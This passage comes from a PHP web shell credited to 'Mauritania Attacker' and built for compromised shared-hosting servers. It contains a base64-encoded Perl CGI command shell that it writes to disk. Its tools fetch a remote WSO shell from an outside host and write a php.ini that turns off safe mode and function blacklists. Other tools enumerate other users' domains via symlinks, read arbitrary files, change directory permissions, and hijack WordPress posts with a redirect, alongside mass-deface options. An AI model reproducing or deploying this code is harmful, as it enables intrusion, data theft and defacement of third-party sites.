lcg0Kew0KCWxvY2FsKCRTZW5kRmlsZSkgPSBAXzsNCglpZihvcGVuKFNFTkRGSUxFLCAkU2VuZEZpbGUpKSAjIGZpbGUgb3BlbmVkIGZvciByZWFkaW5nDQoJew0KCQlpZigkV2luTlQpDQoJCXsNCgkJCWJpbm1vZGUoU0VOREZJTEUpOw0KCQkJYmlubW9kZShTVERPVVQpOw0KCQl9DQoJCSRGaWxlU2l6ZSA9IChzdGF0KCRTZW5kRmlsZSkpWzddOw0KCQkoJEZpbGVuYW1lID0gJFNlbmRGaWxlKSA9fiAgbSEoW14vXlxcXSopJCE7DQoJCXByaW50ICJDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtdW5rbm93blxuIjsNCgkJcHJpbnQgIkNvbnRlbnQtTGVuZ3RoOiAkRmlsZVNpemVcbiI7DQoJCXByaW50ICJDb250ZW50LURpc3Bvc2l0aW9uOiBhdHRhY2htZW50OyBmaWxlbmFtZT0kMVxuXG4iOw0KCQlwcmludCB3aGlsZSg8U0VOREZJTEU+KTsNCgkJY2xvc2UoU0VOREZJTEUpOw0KCX0NCgllbHNlICMgZmFpbGVkIHRvIG9wZW4gZmlsZQ0KCXsNCgkJJlByaW50UGFnZUhlYWRlcigiZiIpOw0KCQlwcmludCAiRmFpbGVkIHRvIGRvd25sb2FkICRTZW5kRmlsZTogJCEiOw0KCQkmUHJpbnRGaWxlRG93bmxvYWRGb3JtOw0KDQoJCSZQcmludFBhZ2VGb290ZXI7DQoJfQ0KfQ0KDQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdXNlciBkb3dubG9hZHMgYSBmaWxlLiBJdCBkaXNwbGF5cyBhIG1lc3NhZ2UNCiMgdG8gdGhlIHVzZXIgYW5kIHByb3ZpZGVzIGEgbGluayB0aHJvdWdoIHdoaWNoIHRoZSBmaWxlIGNhbiBiZSBkb3dubG9hZGVkLg0KIyBUaGlzIGZ1bmN0aW9uIGlzIGFsc28gY2FsbGVkIHdoZW4gdGhlIHVzZXIgY2xpY2tzIG9uIHRoYXQgbGluay4gSW4gdGhpcyBjYXNlLA0KIyB0aGUgZmlsZSBpcyByZWFkIGFuZCBzZW50IHRvIHRoZSBicm93c2VyLg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIEJlZ2luRG93bmxvYWQNCnsNCgkjIGdldCBmdWxseSBxdWFsaWZpZWQgcGF0aCBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkDQoJaWYoKCRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlxcfF4uOi8pKSB8DQoJCSghJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXC8vKSkpICMgcGF0aCBpcyBhYnNvbHV0ZQ0KCXsNCgkJJFRhcmdldEZpbGUgPSAkVHJhbnNmZXJGaWxlOw0KCX0NCgllbHNlICMgcGF0aCBpcyByZWxhdGl2ZQ0KCXsNCgkJY2hvcCgkVGFyZ2V0RmlsZSkgaWYoJFRhcmdldEZpbGUgPSAkQ3VycmVudERpcikgPX4gbS9bXFxcL10kLzsNCgkJJFRhcmdldEZpbGUgLj0gJFBhdGhTZXAuJFRyYW5zZmVyRmlsZTsNCgl9DQoNCglpZigkT3B0aW9ucyBlcSAiZ28iKSAjIHdlIGhhdmUgdG8gc2VuZCB0aGUgZmlsZQ0KCXsNCgkJJlNlbmRGaWxlVG9Ccm93c2VyKCRUYXJnZXRGaWxlKTsNCgl9DQoJZWxzZSAjIHdlIGhhdmUgdG8gc2VuZCBvbmx5IHRoZSBsaW5rIHBhZ2UNCgl7DQoJCSZQcmludERvd25sb2FkTGlua1BhZ2UoJFRhcmdldEZpbGUpOw0KCX0NCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB3aGVuIHRoZSB1c2VyIHdhbnRzIHRvIHVwbG9hZCBhIGZpbGUuIElmIHRoZQ0KIyBmaWxlIGlzIG5vdCBzcGVjaWZpZWQsIGl0IGRpc3BsYXlzIGEgZm9ybSBhbGxvd2luZyB0aGUgdXNlciB0byBzcGVjaWZ5IGENCiMgZmlsZSwgb3RoZXJ3aXNlIGl0IHN0YXJ0cyB0aGUgdXBsb2FkIHByb2Nlc3MuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgVXBsb2FkRmlsZQ0Kew0KCSMgaWYgbm8gZmlsZSBpcyBzcGVjaWZpZWQsIHByaW50IHRoZSB1cGxvYWQgZm9ybSBhZ2Fpbg0KCWlmKCRUcmFuc2ZlckZpbGUgZXEgIiIpDQoJew0KCQkmUHJpbnRQYWdlSGVhZGVyKCJmIik7DQoJCSZQcmludEZpbGVVcGxvYWRGb3JtOw0KCQkmUHJpbnRQYWdlRm9vdGVyOw0KCQlyZXR1cm47DQoJfQ0KCSZQcmludFBhZ2VIZWFkZXIoImMiKTsNCg0KCSMgc3RhcnQgdGhlIHVwbG9hZGluZyBwcm9jZXNzDQoJcHJpbnQgIlVwbG9hZGluZyAkVHJhbnNmZXJGaWxlIHRvICRDdXJyZW50RGlyLi4uPGJyPiI7DQoNCgkjIGdldCB0aGUgZnVsbGx5IHF1YWxpZmllZCBwYXRobmFtZSBvZiB0aGUgZmlsZSB0byBiZSBjcmVhdGVkDQoJY2hvcCgkVGFyZ2V0TmFtZSkgaWYgKCRUYXJnZXROYW1lID0gJEN1cnJlbnREaXIpID1+IG0vW1xcXC9dJC87DQoJJFRyYW5zZmVyRmlsZSA9fiBtIShbXi9eXFxdKikkITsNCgkkVGFyZ2V0TmFtZSAuPSAkUGF0aFNlcC4kMTsNCg0KCSRUYXJnZXRGaWxlU2l6ZSA9IGxlbmd0aCgkaW57J2ZpbGVkYXRhJ30pOw0KCSMgaWYgdGhlIGZpbGUgZXhpc3RzIGFuZCB3ZSBhcmUgbm90IHN1cHBvc2VkIHRvIG92ZXJ3cml0ZSBpdA0KCWlmKC1lICRUYXJnZXROYW1lICYmICRPcHRpb25zIG5lICJvdmVyd3JpdGUiKQ0KCXsNCgkJcHJpbnQgIkZhaWxlZDogRGVzdGluYXRpb24gZmlsZSBhbHJlYWR5IGV4aXN0cy48YnI+IjsNCgl9DQoJZWxzZSAjIGZpbGUgaXMgbm90IHByZXNlbnQNCgl7DQoJCWlmKG9wZW4oVVBMT0FERklMRSwgIj4kVGFyZ2V0TmFtZSIpKQ0KCQl7DQoJCQliaW5tb2RlKFVQTE9BREZJTEUpIGlmICRXaW5OVDsNCgkJCXByaW50IFVQTE9BREZJTEUgJGlueydmaWxlZGF0YSd9Ow0KCQkJY2xvc2UoVVBMT0FERklMRSk7DQoJCQlwcmludCAiVHJhbnNmZXJlZCAkVGFyZ2V0RmlsZVNpemUgQnl0ZXMuPGJyPiI7DQoJCQlwcmludCAiRmlsZSBQYXRoOiAkVGFyZ2V0TmFtZTxicj4iOw0KCQl9DQoJCWVsc2UNCgkJew0KCQkJcHJpbnQgIkZhaWxlZDogJCE8YnI+IjsNCgkJfQ0KCX0NCglwcmludCAiIjsNCgkmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsNCg0KCSZQcmludFBhZ2VGb290ZXI7DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdXNlciB3YW50cyB0byBkb3dubG9hZCBhIGZpbGUuIElmIHRoZQ0KIyBmaWxlbmFtZSBpcyBub3Qgc3BlY2lmaWVkLCBpdCBkaXNwbGF5cyBhIGZvcm0gYWxsb3dpbmcgdGhlIHVzZXIgdG8gc3BlY2lmeSBhDQojIGZpbGUsIG90aGVyd2lzZSBpdCBkaXNwbGF5cyBhIG1lc3NhZ2UgdG8gdGhlIHVzZXIgYW5kIHByb3ZpZGVzIGEgbGluaw0KIyB0aHJvdWdoICB3aGljaCB0aGUgZmlsZSBjYW4gYmUgZG93bmxvYWRlZC4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBEb3dubG9hZEZpbGUNCnsNCgkjIGlmIG5vIGZpbGUgaXMgc3BlY2lmaWVkLCBwcmludCB0aGUgZG93bmxvYWQgZm9ybSBhZ2Fpbg0KCWlmKCRUcmFuc2ZlckZpbGUgZXEgIiIpDQoJew0KCQkmUHJpbnRQYWdlSGVhZGVyKCJmIik7DQoJCSZQcmludEZpbGVEb3dubG9hZEZvcm07DQoJCSZQcmludFBhZ2VGb290ZXI7DQoJCXJldHVybjsNCgl9DQoJDQoJIyBnZXQgZnVsbHkgcXVhbGlmaWVkIHBhdGggb2YgdGhlIGZpbGUgdG8gYmUgZG93bmxvYWRlZA0KCWlmKCgkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cXHxeLjovKSkgfA0KCQkoISRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlwvLykpKSAjIHBhdGggaXMgYWJzb2x1dGUNCgl7DQoJCSRUYXJnZXRGaWxlID0gJFRyYW5zZmVyRmlsZTsNCgl9DQoJZWxzZSAjIHBhdGggaXMgcmVsYXRpdmUNCgl7DQoJCWNob3AoJFRhcmdldEZpbGUpIGlmKCRUYXJnZXRGaWxlID0gJEN1cnJlbnREaXIpID1+IG0vW1xcXC9dJC87DQoJCSRUYXJnZXRGaWxlIC49ICRQYXRoU2VwLiRUcmFuc2ZlckZpbGU7DQoJfQ0KDQoJaWYoJE9wdGlvbnMgZXEgImdvIikgIyB3ZSBoYXZlIHRvIHNlbmQgdGhlIGZpbGUNCgl7DQoJCSZTZW5kRmlsZVRvQnJvd3NlcigkVGFyZ2V0RmlsZSk7DQoJfQ0KCWVsc2UgIyB3ZSBoYXZlIHRvIHNlbmQgb25seSB0aGUgbGluayBwYWdlDQoJew0KCQkmUHJpbnREb3dubG9hZExpbmtQYWdlKCRUYXJnZXRGaWxlKTsNCgl9DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgTWFpbiBQcm9ncmFtIC0gRXhlY3V0aW9uIFN0YXJ0cyBIZXJlDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQomUmVhZFBhcnNlOw0KJkdldENvb2tpZXM7DQoNCiRTY3JpcHRMb2NhdGlvbiA9ICRFTlZ7J1NDUklQVF9OQU1FJ307DQokU2VydmVyTmFtZSA9ICRFTlZ7J1NFUlZFUl9OQU1FJ307DQokTG9naW5QYXNzd29yZCA9ICRpbnsncCd9Ow0KJFJ1bkNvbW1hbmQgPSAkaW57J2MnfTsNCiRUcmFuc2ZlckZpbGUgPSAkaW57J2YnfTsNCiRPcHRpb25zID0gJGlueydvJ307DQoNCiRBY3Rpb24gPSAkaW57J2EnfTsNCiRBY3Rpb24gPSAibG9naW4iIGlmKCRBY3Rpb24gZXEgIiIpOyAjIG5vIGFjdGlvbiBzcGVjaWZpZWQsIHVzZSBkZWZhdWx0DQoNCiMgZ2V0IHRoZSBkaXJlY3RvcnkgaW4gd2hpY2ggdGhlIGNvbW1hbmRzIHdpbGwgYmUgZXhlY3V0ZWQNCiRDdXJyZW50RGlyID0gJGlueydkJ307DQpjaG9wKCRDdXJyZW50RGlyID0gYCRDbWRQd2RgKSBpZigkQ3VycmVudERpciBlcSAiIik7DQoNCiRMb2dnZWRJbiA9ICRDb29raWVzeydTQVZFRFBXRCd9IGVxICRQYXNzd29yZDsNCg0KaWYoJEFjdGlvbiBlcSAibG9naW4iIHx8ICEkTG9nZ2VkSW4pICMgdXNlciBuZWVkcy9oYXMgdG8gbG9naW4NCnsNCgkmUGVyZm9ybUxvZ2luOw0KDQp9DQplbHNpZigkQWN0aW9uIGVxICJjb21tYW5kIikgIyB1c2VyIHdhbnRzIHRvIHJ1biBhIGNvbW1hbmQNCnsNCgkmRXhlY3V0ZUNvbW1hbmQ7DQp9DQplbHNpZigkQWN0aW9uIGVxICJ1cGxvYWQiKSAjIHVzZXIgd2FudHMgdG8gdXBsb2FkIGEgZmlsZQ0Kew0KCSZVcGxvYWRGaWxlOw0KfQ0KZWxzaWYoJEFjdGlvbiBlcSAiZG93bmxvYWQiKSAjIHVzZXIgd2FudHMgdG8gZG93bmxvYWQgYSBmaWxlDQp7DQoJJkRvd25sb2FkRmlsZTsNCn0NCmVsc2lmKCRBY3Rpb24gZXEgImxvZ291dCIpICMgdXNlciB3YW50cyB0byBsb2dvdXQNCnsNCgkmUGVyZm9ybUxvZ291dDsNCn0=';

$file = fopen("vw.root" ,"w+");
$write = fwrite ($file ,base64_decode($cgipl));
fclose($file);
chmod("vw.root",0755);
echo "<br><center><span style='font-size:30px; font-family:Fredericka the Great; color:#009900'>Bypass Perl Security</span><br><br><iframe src=cgipl/vw.root width=75% height=50% frameborder=0></iframe>
 
</div>"; 
}
if(isset($_GET['action']) && $_GET['action'] == 'posget'){
echo '<center><b class="conte">
<a href="?action=grasy">Bypass /etc/passwd</a> -
<a href="?action=nemcon">Bypass Users Server</a> -
<a href="?action=cgipl">Bypass Perl Security</a> -
<a href="?action=bypsrootwzp">Bypass With Zip File</a> -
<a href="?action=bforb">Bypass system function</a> -
<a href="?action=rootexecbpass">Bypass With exec Function</a> -
<a href="?action=rootshelleexecbpass">Bypass With shell_exec</a> -
<a href="?action=posget">Bypass posix_getpwuid</a> -
<a href="?action=suphp">Bypass PHP Suhosin function blacklist</a> -
<a href="?action=suppet">Bypass Functions suPHP_ConfigPath</a> -
<a href="?action=setphr">Bypass suPHP Security</a> -
<a href="?action=simpelb">Simple Bypasser</a> -
<a href="?action=ritf">Read Files</a> -
<a href="?action=baidir">Bypass Chmod Directory</a> -
<a href="?action=forb14">Bypass Forbidden 2014</a> -
<a href="?action=smod14">Bypass SafeMode 2014 Priv8</a> </center>
</b>';
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Bypass posix_getpwuid</span><center><br>';
echo '<form method="POST">
<input size="20" value="0" name="min" type="text">
<font face="Tahoma" color="#007700" size="2pt"> to </font>
<input size="20" value="1024" name="max" type="text"> <input value="Symlink" name="" type="submit">
</form><br>';
if($_POST){
$min = $_POST['min'];
$max = $_POST['max'];
echo"<div class='tmp'><table align='center' width='40%'><td><font color='#e4e4e4'><b>Domains</b></font></td><td><font color='#e4e4e4'><b>Users</b></font></td><td><font color='#e4e4e4'><b>Symlink</b> </font></td>";

$p = 0;
error_reporting(0);
$list = scandir("/var/named");
for($p = $min; $min <= $max; $p++)
{
$user = posix_getpwuid($p);
if(is_array($user)){
	
foreach($list as $domain){
if(strpos($domain,".db")){
$domain = str_replace('.db','',$domain);
$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
if($owner['name'] == $user['name'])
{
$i += 1;
$cheechee = checkAlexa($domain);
echo "<tr><td class='cone'><a href='http://".$domain." '>".$domain."</a> <font color='#00bb00'>- </font><font color='#e4e4e4'>".$cheechee."</font></td><center><td class='cone'><font color='#00bb00'>".$user['name']."</font></center></td><td class='cone'><center><a href='sim/rut".$owner['dir']."/public_html/' target='_blank'>Dir</a></center></td>";
}
}
}	
}
}
echo "<center><font face='Tahoma' color='#00bb00' size='2pt'>Total Domains Found:</font><font face='Tahoma' color='#00bb00' size='2pt'> ".$i."</font></center><br />";
}
echo "</table></div><br><br>";
}
if(isset($_GET['action']) && $_GET['action'] == 'suphp'){
echo '<center><b class="conte">
<a href="?action=grasy">Bypass /etc/passwd</a> -
<a href="?action=nemcon">Bypass Users Server</a> -
<a href="?action=cgipl">Bypass Perl Security</a> -
<a href="?action=bypsrootwzp">Bypass With Zip File</a> -
<a href="?action=bforb">Bypass system function</a> -
<a href="?action=rootexecbpass">Bypass With exec Function</a> -
<a href="?action=rootshelleexecbpass">Bypass With shell_exec</a> -
<a href="?action=posget">Bypass posix_getpwuid</a> -
<a href="?action=suphp">Bypass PHP Suhosin function blacklist</a> -
<a href="?action=suppet">Bypass Functions suPHP_ConfigPath</a> -
<a href="?action=setphr">Bypass suPHP Security</a> -
<a href="?action=simpelb">Simple Bypasser</a> -
<a href="?action=ritf">Read Files</a> -
<a href="?action=baidir">Bypass Chmod Directory</a> -
<a href="?action=forb14">Bypass Forbidden 2014</a> -
<a href="?action=smod14">Bypass SafeMode 2014 Priv8</a> </center>
</b>';
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Bypass PHP Suhosin Function Blacklist</span><center><br>';
echo "<br><form method='POST'>
<input type='text' name='path' size='25' value=".dirname(__FILE__)." '>
<input type='text' name='shell' size='25' value='http://files.xakep.biz/shells/PHP/wso.txt'>
<input type='submit' value='Bypass' name='start'><br><br>";
echo "<textarea class='area' rows='15' cols='78'>virusa worm Mode :) \n";
if($_POST['start']) {
$path = $_POST['path'];
$file = $_POST['shell'];
$htaccess = "suPHP_ConfigPath $path/vworm/php.ini";
$phpini = "c2FmZV9tb2RlID0gT0ZGCnN1aG9zaW4uZXhlY3V0b3IuZnVuYy5ibGFja2xpc3QgPSBOT05FCmRpc2FibGVfZnVuY3Rpb25zID0gTk9ORQ==";
$dir = "vworm"; 
if(file_exists($dir)) {
echo "[+] vworm Folder There Before :)\n";
} else {
@mkdir($dir); {
echo "[+] vworm Folder Created :D\n";
} }
#Generate Sh3LL
$fopen = fopen("vworm/vw.php",'w');
$shell = @file_get_contents($file);
$swrite = fwrite($fopen ,$shell);
if($swrite){
echo "[+] Shell Has Been Generated Name : vw.php \n";
} else {
echo "[~] Can't Generate Shell\n";
}
fclose($fopen);
#Generate Htaccess
$hopen = fopen("vworm/.htaccess", "w");
$hwrite = fwrite($hopen, $htaccess);
if($hwrite){
echo "[+] htaccess Generated\n";
} else {
echo "[~] Can't Generate htaccess\n";
}
fclose($hopen);
$ini = fopen("vworm/php.ini" ,"w");
$php = fwrite($ini, base64_decode($phpini));
if($php){
echo "[+] PHP.INI Generated";
} else {
echo "[-] Can't Generate PHP.INI";
}
}
echo "</textarea>";
}
if(isset($_GET['action']) && $_GET['action'] == 'simpelb'){
echo '<center><b class="conte">
<a href="?action=grasy">Bypass /etc/passwd</a> -
<a href="?action=nemcon">Bypass Users Server</a> -
<a href="?action=cgipl">Bypass Perl Security</a> -
<a href="?action=bypsrootwzp">Bypass With Zip File</a> -
<a href="?action=bforb">Bypass system function</a> -
<a href="?action=rootexecbpass">Bypass With exec Function</a> -
<a href="?action=rootshelleexecbpass">Bypass With shell_exec</a> -
<a href="?action=posget">Bypass posix_getpwuid</a> -
<a href="?action=suphp">Bypass PHP Suhosin function blacklist</a> -
<a href="?action=suppet">Bypass Functions suPHP_ConfigPath</a> -
<a href="?action=setphr">Bypass suPHP Security</a> -
<a href="?action=simpelb">Simple Bypasser</a> -
<a href="?action=ritf">Read Files</a> -
<a href="?action=baidir">Bypass Chmod Directory</a> -
<a href="?action=forb14">Bypass Forbidden 2014</a> -
<a href="?action=smod14">Bypass SafeMode 2014 Priv8</a> </center>
</b>';
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Simple Bypasser</span><center><br>';
echo '<br><font face="Tahoma" color="#007700" size="2pt">Create Folder : </font>
<input type="text" name="dir" size="43" value="worm"> 
<input type="submit" value="Create" name="folder"> <br> <br>
<font face="Tahoma" color="#007700" size="2pt">Get File : </font><br>
<input type="text" name="get" size="16" value="url file .txt"> 
<input type="text" name="name" size="15" value="worm.php">
<input type="text" name="select" size="16" value='.dirname(__FILE__).'>
<input type="submit" value="GET" name="fileget"> <br> <br>
<font face="Tahoma" color="#007700" size="2pt">Fopen File : </font><br>
<input type="text" name="save" size="29" value="vwo.php">
<input type="text" name="path2" size="29" value='.dirname(__FILE__).'><br><br>
<textarea class="area" name="source" cols="78" rows="15">PHP Code</textarea><br><br>
<input type="submit" value="Save" name="fopen">';

if($_POST['folder']) {
$mk = $_POST['dir'];
$func = "bWtkaXI=";
$de = base64_decode($func);
$rules1 = $de($mk);
if ($mk) { 
echo "<br><b class='cone'>[+] Done [ $mk ] Created !</b>";
} }
# File Get Contents
if($_POST['fileget']) {
$get = $_POST['get'];
$n4m = $_POST['name'];
$path = $_POST['select'];
$func2 = "ZmlsZV9nZXRfY29udGVudHM=";
$de2 = base64_decode($func2);
$rules2 = $de2($get);
$open = fopen("$path/$n4m", 'w'); 
fwrite($open,$rules2);
fclose($open);
if($get) { 
echo "done";
} }
#
# fopen File
if($_POST['fopen']) {
$save = $_POST['save'];
$path2 = $_POST['path2'];
$open2 = fopen("$path2/$save", 'w');
$source1 = $_POST['source'];
$source2 = stripslashes($source1);
fwrite($open2 ,$source2);
fclose($open2);
if($open2) {
echo "<b class='tmp'>Done</b>";
} }
}
if(isset($_GET['action']) && $_GET['action'] == 'ritf'){
echo '<center><b class="conte">
<a href="?action=grasy">Bypass /etc/passwd</a> -
<a href="?action=nemcon">Bypass Users Server</a> -
<a href="?action=cgipl">Bypass Perl Security</a> -
<a href="?action=bypsrootwzp">Bypass With Zip File</a> -
<a href="?action=bforb">Bypass system function</a> -
<a href="?action=rootexecbpass">Bypass With exec Function</a> -
<a href="?action=rootshelleexecbpass">Bypass With shell_exec</a> -
<a href="?action=posget">Bypass posix_getpwuid</a> -
<a href="?action=suphp">Bypass PHP Suhosin function blacklist</a> -
<a href="?action=suppet">Bypass Functions suPHP_ConfigPath</a> -
<a href="?action=setphr">Bypass suPHP Security</a> -
<a href="?action=simpelb">Simple Bypasser</a> -
<a href="?action=ritf">Read Files</a> -
<a href="?action=baidir">Bypass Chmod Directory</a> -
<a href="?action=forb14">Bypass Forbidden 2014</a> -
<a href="?action=smod14">Bypass SafeMode 2014 Priv8</a> </center>
</b>';
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Bypass Read File</span><center><br>';
echo "<form method='POST' /> 
<select name='website'>
<option value='show_source'>show_source</option>
<option value='highlight_file'>highlight_file</option>
<option value='readfile'>readfile</option>
<option value='include'>include</option>
<option value='require'>require</option>
<option value='file'>file</option>
<option value='fread'>fread</option>
<option value='file_get_contents'>file_get_contents</option>
<option value='fgets'>fgets</option> 
<input type='text' name='file' size='22' /><input type='submit' name='start'   value='Read Now' />
</select>";

function readfils($file) {

$web = $_POST['website'];

switch ($web)
{
case 'show_source': $show =  @show_source($file);  break;

case 'highlight_file': $highlight = @highlight_file($file); break;

case 'readfile': $readfile = @readfile($file);  break;

case 'include': $include = @include($file); break;

case 'require': $require = @require($file);  break;

case 'file': $file =  @file($file);  foreach ($file as $key => $value) {  print $value; }  break;

case 'fread': $fopen = @fopen($file,"r") or die("Unable to open file!"); $fread = @fread($fopen,90000); fclose($fopen); print_r($fread); break;

case 'file_get_contents': $file_get_contents =  @file_get_contents($file); print_r($file_get_contents);  break;

case 'fgets': $fgets = @fopen($file,"r") or die("Unable to open file!"); while(!feof($fgets)) { echo fgets($fgets); } fclose($fgets); break;

default: 
echo "{$web} Not There"; 
} 
}
	  
echo "<br><br><textarea class='area' rows='15' cols='68' />";
$file = trim($_POST['file']);
if($_POST['start'])
{
readfils($file); }
echo "</textarea>";
}
if(isset($_GET['action']) && $_GET['action'] == 'wrdprshtmlinj'){
echo '<center><b class="conte">
<a href="?action=mass">Mass Deface Dirs</a> -
<a href="?action=joomla">Mass Change Admin Joomla</a> -
<a href="?action=vb">Mass Change Admin vBulletin</a> -
<a href="?action=wp">Mass Change Admin WordPress</a> -
<a href="?action=wpandjmlamassdfce">Wordpress & Joomla Mass Deface</a> -
<a href="?action=wrdprshtmlinj">Wordpress Index Hijack Priv8</a> -
<a href="?action=joommlallainxc">Joomla Index Changer</a> -
<a href="?action=wpidxcngrdesr">Wordpress Index Changer</a> -
<a href="?action=cpnlndftpotdfr">Cpanel & Ftp Auto Defacer</a> </center>
</b>';
echo '<form method="POST">
<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Wordpress Index Hijack Priv8</span></center><br>
<p align="center"> 
<img src="http://www3.0zz0.com/2014/08/20/15/615506358.png" /></p>

<br><center><font color="#007700" size="2" face="orion">Coded By Mauritania Attacker</font></center><br>
<center><input type="text" value="localhost" name="pghost">
<input type="text" value="database_name" name="dbnmn">
<input type="text" value="prefix" name="prefix">
<input type="text" value="username_db" name="dbusrrrr">
<input type="text" value="password_db" name="pwddbbn"></center><br>
<center><textarea class="area" name="pown" cols="100" rows="7"><meta http-equiv="refresh" content="0;URL=http://pastebin.com/raw.php?i=WG1zASMG"></textarea><br><br>
<input type="submit" name="up2" value="Hijack Index"><br></center><form>';
$pghost = $_POST['pghost'];
$dbnmn = $_POST['dbnmn'];
$dbusrrrr = $_POST['dbusrrrr'];
$pwddbbn = $_POST['pwddbbn'];
$index = stripslashes($_POST['pown']);
$prefix = $_POST['prefix'];
//$prefix = "wp_";
if ($_POST['up2']) {
@mysql_connect($pghost, $dbusrrrr, $pwddbbn) or die(mysql_error());
@mysql_select_db($dbnmn) or die(mysql_error());
$tableName = $prefix . "posts";
$ghost1 = mysql_query("UPDATE $tableName SET post_title ='" . $index . "' WHERE ID > 0 ");
if (!$ghost1) {
$ghost2 = mysql_query("UPDATE $tableName SET post_content ='" . $index . "' WHERE ID > 0 ");
} elseif (!$ghost2) {
$ghost3 = mysql_query("UPDATE $tableName SET post_name ='" . $index . "' WHERE ID > 0 ");
}
mysql_close();
if ($ghost1 || $ghost2 || $ghost3) {
echo "<center><p><b><font color='red'>Index Website Have been Hijacked Successfully</font></p></b></center>";
} else {
echo "<center><p><b><font color='red'>Failed To Hijack the Website :(</font></p></b></center>";
}
}
}


if(isset($_GET['action']) && $_GET['action'] == 'baidir'){
echo '<center><b class="conte">
<a href="?action=grasy">Bypass /etc/passwd</a> -
<a href="?action=nemcon">Bypass Users Server</a> -
<a href="?action=cgipl">Bypass Perl Security</a> -
<a href="?action=bypsrootwzp">Bypass With Zip File</a> -
<a href="?action=bforb">Bypass system function</a> -
<a href="?action=rootexecbpass">Bypass With exec Function</a> -
<a href="?action=rootshelleexecbpass">Bypass With shell_exec</a> -
<a href="?action=posget">Bypass posix_getpwuid</a> -
<a href="?action=suphp">Bypass PHP Suhosin function blacklist</a> -
<a href="?action=suppet">Bypass Functions suPHP_ConfigPath</a> -
<a href="?action=setphr">Bypass suPHP Security</a> -
<a href="?action=simpelb">Simple Bypasser</a> -
<a href="?action=ritf">Read Files</a> -
<a href="?action=baidir">Bypass Chmod Directory</a> -
<a href="?action=forb14">Bypass Forbidden 2014</a> -
<a href="?action=smod14">Bypass SafeMode 2014 Priv8</a> </center>
</b>';
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Bypass Chmod Directory Priv8</span><br>Coded By Mauritania Attacker<center><br><br>';
echo '<form action="" method="post">
<p>
<center>
<input type="text" name="file" placeholder="/home/user/public_html/directory">
<input type="submit" name="bypass" value="Bypass Chmod Dir">
</form></center></p>';

if($_POST)
{
$mauritania = $_POST['file'];
$ch = @chmod($mauritania,'0311');
if($ch)
{
echo "[+] Directory  <font face='Tahoma' size='3' color='#b0b000'> =>{$mauritania}               => [+] Permission Changed Successfully Bypassed ^_^ [+]";
}
else
{
echo "[-] Directory  <font face='Tahoma' size='3' color='red'> =>{$mauritania}                 => [-] Permission can't be changed , maybe chmod function is disabled :( [-]";
}
}
}
if(isset($_GET['action']) && $_GET['action'] == 'forb14'){
echo '<center><b class="conte">
<a href="?action=grasy">Bypass /etc/passwd</a> -
<a href="?action=nemcon">Bypass Users Server</a> -
<a href="?action=cgipl">Bypass Perl Security</a> -
<a href="?action=bypsrootwzp">Bypass With Zip File</a> -
<a href="?action=bforb">Bypass system function</a> -
<a href="?action=rootexecbpass">Bypass With exec Function</a> -
<a href="?action=rootshelleexecbpass">Bypass With shell_exec</a> -
<a href="?action=posget">Bypass posix_getpwuid</a> -
<a href="?action=suphp">Bypass PHP Suhosin function blacklist</a> -
<a href="?action=suppet">Bypass Functions suPHP_ConfigPath</a> -
<a href="?action=setphr">Bypass suPHP Security</a> -
<a href="?action=simpelb">Simple Bypasser</a> -
<a href="?action=ritf">Read Files</a> -
<a href="?action=baidir">Bypass Chmod Directory</a> -
<a href="?action=forb14">Bypass Forbidden 2014</a> -
<a href="?action=smod14">Bypass SafeMode 2014 Priv8</a> </center>
</b>';
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Bypass Forbidden 2014</span><br>Coded by Mauritania Attacker<center><br><br>';
$fp = fopen("php.ini","w+");
fwrite($fp,"safe_mode = OFF
Safe_mode_gid = OFF
